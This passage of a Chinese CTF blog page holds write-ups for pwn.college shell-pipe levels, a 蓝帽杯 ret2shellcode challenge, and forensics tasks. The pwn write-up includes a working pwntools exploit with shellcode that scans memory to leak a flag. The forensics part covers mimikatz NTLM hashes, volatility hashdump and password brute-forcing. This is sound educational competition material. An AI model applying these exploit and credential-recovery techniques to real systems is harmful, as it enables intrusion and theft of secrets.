+          <a href="/2022/07/12/embryoio%20level36~level59/" class="post-title-link" itemprop="url">embryoio level36~level59</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-07-12 20:07:00 / 修改时间：20:09:09" itemprop="dateCreated datePublished" datetime="2022-07-12T20:07:00+08:00">2022-07-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/pwncollege%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">pwncollege刷题</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="embryoio-level36-level47"><a href="#embryoio-level36-level47" class="headerlink" title="embryoio level36~level47"></a>embryoio level36~level47</h1><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>Linux终端和shell脚本的管道符使用</p>
+<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/image-20220712132719498.png" alt="image-20220712132719498"></p>
+<p>它显示需要我们去接收程序的输出流，而且下面有说需要用管道，所以指令后面加上管道接其它指令即可。</p>
+<h3 id="shell指令"><a href="#shell指令" class="headerlink" title="shell指令"></a>shell指令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">/challenge/embryoio36 | cat</span><br><span class="line"></span><br><span class="line">/challenge/embryoio_level37 | grep &#x27;pwn&#x27; #取关键字</span><br><span class="line"></span><br><span class="line">/challenge/embryoio_level38 | sed &#x27;1d&#x27;	#删除第一行</span><br><span class="line"></span><br><span class="line">/challenge/embryoio_level39 | rev | rev	#两次取反就正常输出了</span><br><span class="line"></span><br><span class="line">cat | /challenge/embryoio_level40	#再输入密码获得flag</span><br><span class="line"></span><br><span class="line">rev | rev | /challenge/embryoio_level41	#两次取反后直接输入密码获得flag（可能输入密码后需要按ctrl+d flag才会出现）</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">以下指令要写入shell脚本中，再bash运行shell脚本</span></span><br><span class="line">/challenge/embryoio_level42 | cat</span><br><span class="line"></span><br><span class="line">/challenge/embryoio_level43 | grep &#x27;pwn&#x27;</span><br><span class="line"></span><br><span class="line">/challenge/embryoio_level44 | sed &#x27;1d&#x27;</span><br><span class="line"></span><br><span class="line">/challenge/embryoio_level45 | rev | rev</span><br><span class="line"></span><br><span class="line">cat | /challenge/embryoio_level46</span><br><span class="line"></span><br><span class="line">rev | rev | /challenge/embryoio_level47	#直接输入密码获得flag（可能输入密码后需要按ctrl+d flag才会出现）</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="embryoio-level48-level59"><a href="#embryoio-level48-level59" class="headerlink" title="embryoio level48~level59"></a>embryoio level48~level59</h1><h2 id="题目简介-1"><a href="#题目简介-1" class="headerlink" title="题目简介"></a>题目简介</h2><p>python脚本中的管道使用</p>
+<h2 id="解题流程-1"><a href="#解题流程-1" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序-1"><a href="#运行程序-1" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/image-20220712135029230.png" alt="image-20220712135029230"></p>
+<p>可以看到需要让我们用python运行</p>
+<p><img src="/image-20220712135209976.png" alt="image-20220712135209976"></p>
+<p>编写python脚本运行后又出现需要管道接收输出的提示。</p>
+<h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#===============================level48===============================</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&#x27;/challenge/embryoio_level48&#x27;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen(<span class="string">&#x27;cat&#x27;</span>, stdin=io1.stdout, stdout=PIPE)</span><br><span class="line">output = io2.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level49===============================</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level49&quot;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen([<span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;pwn&#x27;</span>], stdin=io1.stdout, stdout=PIPE)</span><br><span class="line">output = io2.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level50===============================</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level50&quot;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen([<span class="string">&#x27;sed&#x27;</span>, <span class="string">&#x27;1d&#x27;</span>], stdin=io1.stdout, stdout=PIPE)</span><br><span class="line">output = io2.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level51===============================</span></span><br><span class="line"><span class="comment">#将逆序的flag复制到文本里，再rev输出</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level51&quot;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen(<span class="string">&#x27;rev&#x27;</span>, stdin=io1.stdout, stdout=PIPE)</span><br><span class="line">output = io2.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level52===============================</span></span><br><span class="line"><span class="comment">#运行后输入密码获得flag</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&#x27;cat&#x27;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level52&quot;</span>, stdin=io1.stdout)</span><br><span class="line">output = io1.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level53===============================</span></span><br><span class="line"><span class="comment">#运行后逆序输入密码获得flag</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&#x27;rev&#x27;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level53&quot;</span>, stdin=io1.stdout)</span><br><span class="line">output = io1.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level54~level59===============================</span></span><br><span class="line"><span class="comment">#又是一遍“十万年轮回”，题目和上诉题目差不多，题解参考上诉脚本。</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://eur1ka.github.io/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eureka's Blog">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Eureka's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/" class="post-title-link" itemprop="url">蓝帽杯初赛pwn1复现</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-07-12 20:02:00" itemprop="dateCreated datePublished" datetime="2022-07-12T20:02:00+08:00">2022-07-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-09-21 11:25:28" itemprop="dateModified" datetime="2022-09-21T11:25:28+08:00">2022-09-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道升级版的ret2shellcode</p>
+<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><p><img src="/image-20220710224631699.png" alt="image-20220710224631699"></p>
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><p><img src="/image-20220710224715244.png" alt="image-20220710224715244"></p>
+<p><code>init_io()</code>就是一个io初始化函数，然后可以看到这道题开了沙盒，那就利用工具检查一下，结果如下图所示</p>
+<p><img src="/image-20220710224957314.png" alt="image-20220710224957314"></p>
+<p>可以看到一个白名单，根据内容可以看出只开了read和write，所以这道题就不用咱们getshell了。</p>
+<h3 id="init-main"><a href="#init-main" class="headerlink" title="init_main()"></a>init_main()</h3><p><img src="/image-20220710225220354.png" alt="image-20220710225220354"></p>
+<p>可以看到<code>heap_mem</code>这个全局变量保存了堆的malloc地址，然后下面的代码其实就将bss段上的内容写到堆上，具体内容如下图所示。</p>
+<p><img src="/image-20220710225451610.png" alt="image-20220710225451610"></p>
+<h3 id="init-flag"><a href="#init-flag" class="headerlink" title="init_flag()"></a>init_flag()</h3><p><img src="/image-20220710225612172.png" alt="image-20220710225612172"></p>
+<p>看到了不得了的东西，直接将flag写到了bss段上。</p>
+<h3 id="go"><a href="#go" class="headerlink" title="go()"></a>go()</h3><p><img src="/image-20220710225729898.png" alt="image-20220710225729898"></p>
+<p>因为<code>heap_mem</code>上保存的是堆的malloc地址，所以这里我们写入的内容是写到了之前创建的堆上，然后也返回到我们之前的堆上面去。</p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>首先运行一下程序</p>
+<p><img src="/image-20220710230113827.png" alt="image-20220710230113827"></p>
+<p>在随便输入一串数据后程序果然崩溃了，当时我以为造成程序崩溃的是堆上的垃圾数据，所以分析到这便没了后续。但是比较敏感的话其实可以感觉的得出来在<code>init_mem()</code>中堆上写的其实并不是随随便便的垃圾数据，进入调试一下便可验证。</p>
+<p><img src="/image-20220710230644865.png" alt="image-20220710230644865"></p>
+<p>如上图所示，其实<code>ret heap_mem()</code>后程序还能继续正常执行，写入到堆中的其实是一句句可执行的汇编指令，最后导致程序崩溃的原因是在后面。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>经过上诉分析程序的利用点还是很好看出来的，我们只需要在read的时候向程序写入攻击的shellcode便可正常执行获取flag。这里可以选择利用write系统调用，直接将flag打印出来。</p>
+<p>&#x3D;&#x3D;因为开启了PIE，所以这里的flag的地址需要我们进行爆破一下，但爆破有个简单的方法：&#x3D;&#x3D;</p>
+<p>在执行完系统调用后，rcx会保存下一条指令的地址（原因涉及内核，感兴趣可去了解），如下图所示。</p>
+<p><img src="/image-20220710231937873.png" alt="image-20220710231937873"></p>
+<p>利用这点我们就可以定位到shellcode地址，因为shllcode保存地址和flag保存地址就差28位，利用and获得其高位保存在rsi 作为基地址，后28位需要爆破，r15存储偏移，每次打印0x1000个字符，打印后跳转到$-0x19也就是mov rax，1处，然后继续从基地址+0x1000开始打印0x1000个字符，如此循环即可。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./escape_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;39.106.156.74&quot;,23470)</span></span><br><span class="line"><span class="comment">#start=0</span></span><br><span class="line">start=<span class="number">0x500000000000</span></span><br><span class="line"><span class="comment">#addr=0x5633c143f000</span></span><br><span class="line">code=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,1</span></span><br><span class="line"><span class="string">    mov rsi,&#123;&#125;</span></span><br><span class="line"><span class="string">    mov r12,0xfffff0000000</span></span><br><span class="line"><span class="string">    mov r15,0x1000#r15储存偏移</span></span><br><span class="line"><span class="string">    mov rdx,0x1000#打印长度设置为0x1000</span></span><br><span class="line"><span class="string">    mov rax,1</span></span><br><span class="line"><span class="string">    syscall#write(rdi,rsi,rdx)</span></span><br><span class="line"><span class="string">    mov rsi,rcx#write执行后rcx 储存着shllcode的相关地址</span></span><br><span class="line"><span class="string">    and rsi,r12#丢弃后28位</span></span><br><span class="line"><span class="string">    add rsi,r15#rsi=rsi+偏移地址</span></span><br><span class="line"><span class="string">    add r15,0x1000#偏移递增0x1000</span></span><br><span class="line"><span class="string">    jmp $-0x19#循环 跳转到mov rax，1 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(start)</span><br><span class="line">payload=asm(code)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line">flag=<span class="string">b&#x27;flag&#123;&#x27;</span>+sh.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实这题不难，比赛过程中被自己误导后就放弃了，也个自己涨了教训，当遇到“绝境“的时候不妨静下心仔细调试一下。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://eur1ka.github.io/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eureka's Blog">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Eureka's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/" class="post-title-link" itemprop="url">2022蓝帽杯初赛WP</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-07-12 19:49:00" itemprop="dateCreated datePublished" datetime="2022-07-12T19:49:00+08:00">2022-07-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-09-21 11:25:01" itemprop="dateModified" datetime="2022-09-21T11:25:01+08:00">2022-09-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="misc-domainhacker"><a href="#misc-domainhacker" class="headerlink" title="misc_domainhacker"></a>misc_domainhacker</h1><p>下载附件，发现是流量分析题，用wireshark打开</p>
+<p><img src="/clip_image002-16573700049682.gif" alt="图片"></p>
+<p>在这里找到了rar文件，导出后发现需要密码，于是继续探索</p>
+<p>在tcp追踪流13发现了有用信息</p>
+<p><img src="/clip_image004.gif" alt="图片"></p>
+<p>阅读拼接进行base64解密试试</p>
+<p><img src="/clip_image006.gif" alt="图片"></p>
+<p>发现了密码，解压压缩包</p>
+<p><img src="/clip_image008.gif" alt="图片"></p>
+<p>发现是mimikatz工具的界面，于是在NTLM这里找到了hash值</p>
+<p><img src="/clip_image010.gif" alt="图片"></p>
+<h1 id="手机取证-1"><a href="#手机取证-1" class="headerlink" title="手机取证_1"></a>手机取证_1</h1><p>用盘古石阅读器打开，搜索题目给出的图片的名字</p>
+<p><img src="/clip_image002-16573700345378.gif" alt="图片"></p>
+<p>导出该图片，并查看该图片属性的详细信息，得到分辨率360x360</p>
+<p><img src="/clip_image004-16573700345389.gif" alt="图片"></p>
+<h1 id="手机取证-2"><a href="#手机取证-2" class="headerlink" title="手机取证_2"></a>手机取证_2</h1><p>题目要求是说让我们找到姜总的快递单号，那么试着搜索下关键字姜总</p>
+<p><img src="/clip_image002-165737006076812.gif" alt="图片"></p>
+<p>果然，在群组聊天中找到了快递单号</p>
+<h1 id="计算机取证-1"><a href="#计算机取证-1" class="headerlink" title="计算机取证_1"></a>计算机取证_1</h1><p>读题发现是内存取证，想到使用工具volatility，第一个要求我们获得taqi7的开机密码，于是用volatility跑跑看，语句：.&#x2F;volatility_2.6_win64_standalone.exe -f 1.dmp –profile&#x3D;Win7SP1x64 hashdump</p>
+<p><img src="/clip_image002-165737008500914.gif" alt="图片"></p>
+<p>找到了，发现是md5加密过的，md5解密</p>
+<p><img src="/clip_image004-165737008501015.gif" alt="图片">得到开机密码anxinqi</p>
+<h1 id="计算机取证-2"><a href="#计算机取证-2" class="headerlink" title="计算机取证_2"></a>计算机取证_2</h1><p>看下题目，要求我们查看进程号，volatility跑一下进程号看看，语句：.&#x2F;volatility_2.6_win64_standalone.exe -f 1.dmp –profile&#x3D;Win7SP1x64 pstree</p>
+<p><img src="/clip_image002-165737010442218.gif" alt="图片"></p>
+<p>看着这个很可疑，但我并不认识，上网搜一搜MagnetRAMCaptu</p>
+<p><img src="/clip_image004-165737010442219.gif" alt="图片"></p>
+<p>看到这里便可以放心提交答案了，查看下pid是2192</p>
+<h1 id="计算机取证-3"><a href="#计算机取证-3" class="headerlink" title="计算机取证_3"></a>计算机取证_3</h1><p>看题发现这个是磁盘性质的取证题了，于是用取证大师</p>
+<p><img src="/clip_image002.jpg" alt="图片"></p>
+<p>导出了三个文件，其中就有ppt</p>
+<p>word和ppt需要密码，还有一个是字典，立马想到了爆破，用passfab for word</p>
+<p><img src="/clip_image004-165737014552022.gif" alt="图片"></p>
+<p>文档密码是688561，打开没有发现什么，把ppt后缀改成docx也一样进行爆破</p>
+<p><img src="/clip_image006-165737014552023.gif" alt="图片"></p>
+<p>得到密码287fuweiuhfiute，改回后缀，输入密码打开，得到flag</p>
+<p><img src="/clip_image008-165737014552024.gif" alt="图片"></p>
+<h1 id="计算机取证-4"><a href="#计算机取证-4" class="headerlink" title="计算机取证_4"></a>计算机取证_4</h1><p>在e01文件中bitlocker解密出来，发现tc加密文件，寻找密钥</p>
+<p>根据题目提示，使用取证大师的工具：内存镜像解析工具进行解析</p>
+<p><img src="/clip_image002-165737018007529.gif" alt="图片"></p>
+<p>导出keyfile</p>
+<p><img src="/clip_image004-165737018007531.gif" alt="图片"></p>
+<p>新建案例，开始取证</p>
+<p><img src="/clip_image006-165737018007530.gif" alt="图片"></p>
+<p>发现哈哈哈.zip，导出该zip，直接暴力破解，得到密码991314</p>
+<p><img src="/clip_image008-165737018007532.gif" alt="图片"></p>
+<p>打开压缩包，得到flag</p>
+<p><img src="/clip_image010-165737018007533.gif" alt="图片"></p>
+<p>flag{1349934913913991394cacacacacacc}</p>
+<h1 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析_1"></a>程序分析_1</h1><p> 将文件下载下来，然后将后缀改为”.zip”，拖入winrar中将配置文件AndroidManifest.xml解压出来。</p>
+<p>然后利用工具AXMLPrinter2将配置文件反编译，编译出来的文件内容中可以看到package字段如下图所示</p>
+<p><img src="/image-20220709190538890.png" alt="image-20220709190538890"></p>
+<p>所以flag为“exec.azj.kny.d.c”。</p>
+<h1 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析_2"></a>程序分析_2</h1><p>上题反编译出来的配置文件中有如下图所示内容</p>
+<p><img src="/image-20220709190735776.png" alt="image-20220709190735776"></p>
+<p>“android.intent.action.MAIN”则代表文集入口“属性”，外面一层的activity标签中的android name值就是入口程序</p>
+<p>所以flag为”minmtta.hemjcbm.ahibyws.MainActivity”.</p>
+<h1 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析_3"></a>程序分析_3</h1><p>将下载下来的文件拖入bytecode viewer中，根据上题的程序入口目录进去，可出现下图所示内容</p>
+<p><img src="/image-20220709191141536.png" alt="image-20220709191141536"></p>
+<p>根据代码大致就可以猜测base64解密的内容就是密文。</p>
+<p>所以flag为“aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6”</p>
+<h1 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析_4"></a>程序分析_4</h1><p>在bytecode viewer中可以看到很多被混淆加密的包，安全检测类很可能就在里面</p>
+<p>根据关键词查找发现如下内容</p>
+<p><img src="/image-20220709191504565.png" alt="image-20220709191504565"></p>
+<p>这应该就是与检测相关的一个类，但起不到检测的作用。再去上级目录看，看到class a中有下图所示关键字段</p>
+<p><img src="/image-20220709191701294.png" alt="image-20220709191701294"></p>
+<p>qemu是Android模拟器，用来模拟检测的，所以猜测这个类就是了。</p>
+<p>所以flag为“a”</p>
+<h1 id="网站取证-1"><a href="#网站取证-1" class="headerlink" title="网站取证_1"></a>网站取证_1</h1><p>题目提示有后门</p>
+<p><img src="/clip_image002.gif" alt="图片"></p>
+<p>d盾扫描获得flag</p>
+<h1 id="网站取证-2"><a href="#网站取证-2" class="headerlink" title="网站取证_2"></a>网站取证_2</h1><p>查看database.php发现密码与my_encrypt()有关，发现该函数在encrypt.php中将encrypt.php部署到本地环境中跑一下，获得flag</p>
+<p><img src="/image-20220709202049506.png" alt="image-20220709202049506"></p>
+<h1 id="网站取证-3"><a href="#网站取证-3" class="headerlink" title="网站取证_3"></a>网站取证_3</h1><p>在Channelorder.php和Channelorderlist.php中都有盐值即$key</p>
+<p><img src="/image-20220709202224818.png" alt="image-20220709202224818"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://eur1ka.github.io/2022/07/12/bof(wp)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eureka's Blog">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Eureka's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/07/12/bof(wp)/" class="post-title-link" itemprop="url">bof</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-07-12 19:46:00 / 修改时间：19:46:37" itemprop="dateCreated datePublished" datetime="2022-07-12T19:46:00+08:00">2022-07-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/pwnable%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">pwnable刷题</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
